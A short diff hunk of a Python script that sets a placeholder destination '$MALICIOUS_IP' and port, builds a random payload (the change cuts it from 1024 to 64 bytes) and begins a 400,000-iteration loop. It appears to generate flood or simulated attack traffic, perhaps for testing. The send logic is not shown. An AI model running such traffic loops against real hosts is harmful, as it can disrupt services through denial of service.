@@ -17,7 +17,7 @@ import string
 
 dest_ip = '$MALICIOUS_IP'
 dest_port = $PORT
-payload = ''.join(random.choice(string.ascii_lowercase) for _ in range(1024)).encode()
+payload = ''.join(random.choice(string.ascii_lowercase) for _ in range(64)).encode()
 
 
 for i in range(400000):
